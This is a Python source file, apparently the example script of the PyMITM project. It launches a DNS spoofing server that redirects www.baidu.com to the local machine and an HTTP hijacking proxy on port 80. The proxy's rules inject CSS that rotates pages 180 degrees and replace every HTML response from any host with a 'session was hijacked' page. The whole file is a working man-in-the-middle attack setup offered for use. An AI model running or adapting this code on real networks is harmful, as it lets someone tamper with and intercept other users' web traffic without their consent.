#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2014-07-01
# @Author  : Robin (sintrb@gmail.com)
# @Link    : https://github.com/sintrb/PyMITM/
# @Version : 1.0

import time
import threading
from util import getselfip
from PyMITMBase import DNSSpoofingServer, HttpHijackServer


def run_server(SevClass, setting):
	server = SevClass(setting)
	server.serve_forever()


def clear_cache(proxyhandler, req):
	print 'clear_cache'
	pass

def rotate_html(proxyhandler, req, res):
	'''
	Roate the web page 180deg.
	'''
	print req.raw_firstline
	style = '''
		<style type="text/css">
		.sin-joke {
		   filter:progid:DXImageTransform.Microsoft.BasicImage(rotation=2);
		   -moz-transform: rotate(180deg);
		   -o-transform: rotate(180deg);
		   -webkit-transform: rotate(180deg);
		   transform: rotate(180deg);
		}
		</style>
		'''
	if res.databody:
		try:
			res.do_unzip()
			res.databody = res.databody.replace('</head>', '%s</head>'%style)
			res.databody = res.databody.replace('<body', '<body class="sin-joke"')
		except:
			# print res.databody
			pass

def response_mypage(proxyhandler, req, res):
	print req.raw_firstline
	# res.do_unzip()
	res.databody = "<!doctype html><html><body><center>You's session was hijacked!</center></body></html>"
	if 'Content-Encoding' in res.headers:
		del res.headers['Content-Encoding']

def start_with_setting(setting):
	if type(setting['dnsspoofing']) == type({}):
		cfg = setting['dnsspoofing']
		t = threading.Thread(target=run_server, args=(DNSSpoofingServer, cfg))
		t.start()
		time.sleep(0.5)
	else:
		for cfg in setting['dnsspoofing']:
			t = threading.Thread(target=run_server, args=(DNSSpoofingServer, cfg))
			t.start()
			time.sleep(0.5)

	if type(setting['httphijack']) == type({}):
		cfg = setting['httphijack']
		t = threading.Thread(target=run_server, args=(HttpHijackServer, cfg))
		t.start()
		time.sleep(0.5)
	else:
		for cfg in setting['httphijack']:
			t = threading.Thread(target=run_server, args=(HttpHijackServer, cfg))
			t.start()
			time.sleep(0.5)
	while True:
		time.sleep(1)



if __name__ == '__main__':
	setting = {
		'dnsspoofing':{	# dns spoofing config
			'listen':{	# listen on *:53, 53 is default dns port
				'host':'0.0.0.0',
				'port':53,
			},
			'logging':{
				'file':'dns.log',
				'console':True,
			},
			'resolvs':(
				('.*',	# spoof all dns query, if you want spoof only 172.16.0.100-172.16.0.109 's query you can use '172.16.0.10[0-9]'
					(
						('www.baidu.com', getselfip()),	# only spoof 'www.baidu.com' to this computer, other hostname resolv to real ip address
					)
				),
			)
		},


		'httphijack':{	# http hijack config
			'listen':{	# listen on *:80, http default port
				'host':'0.0.0.0',
				'port':80,
			},
			'logging':{
				'file':'http.log',
				'console':False,
			},
			'hijacks':(

				# rule 1
				{
					'host':'www.baidu.com',	# when host is www.baidu.com
					# 'path':'.*',	# all path
					# 'method':'.*',	# all method, GET POST PUT ...
					# 'ip':'172.16.0.10[0-9]',	# hijack 172.16.0.100-172.16.0.109 's session
					'request':{	# before request to http server
						# 'headers':{	# and
						# },
						'handler': clear_cache,
					},
					'response':{	# after response from http server
						# 'code':'200',	# status code
						'headers':{ # and
							'Content-Type':'.*html.*'	# only html response will be hijacked
						},
						'handler':rotate_html,	# rotate 90 deg
					},
				},

				# rule 2
				{
					'host':'.*',	# all host
					'path':'.*',	
					'method':'.*',
					'ip':'.*',
					'response':{
						'headers':{ # and
							'Content-Type':'.*html.*'	# only hijack html type response
						},
						'handler': response_mypage,	# response a hijacked page
					},
				},
			)
		}
	}

	start_with_setting(setting)

